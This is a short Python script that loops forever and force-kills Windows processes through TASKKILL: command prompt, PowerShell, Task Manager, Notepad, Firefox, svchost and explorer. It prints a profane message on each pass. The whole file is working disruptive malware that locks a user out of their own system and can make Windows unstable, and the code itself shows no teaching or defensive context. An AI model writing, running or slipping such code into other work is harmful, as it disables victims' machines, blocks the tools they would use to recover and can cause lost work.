import subprocess

while True :
    subprocess.call("TASKKILL /F /IM cmd.exe", shell=True)
    subprocess.call("TASKKILL /F /IM notepad.exe", shell=True)
    subprocess.call("TASKKILL /F /IM powershell.exe", shell=True)
    subprocess.call("TASKKILL /F /IM taskmgr.exe", shell=True)
    subprocess.call("TASKKILL /F /IM firefox.exe", shell=True)
    subprocess.call("TASKKILL /F /IM svchost.exe", shell=True)
    subprocess.call("TASKKILL /F /IM explorer.exe", shell=True)
    print("fuck you")
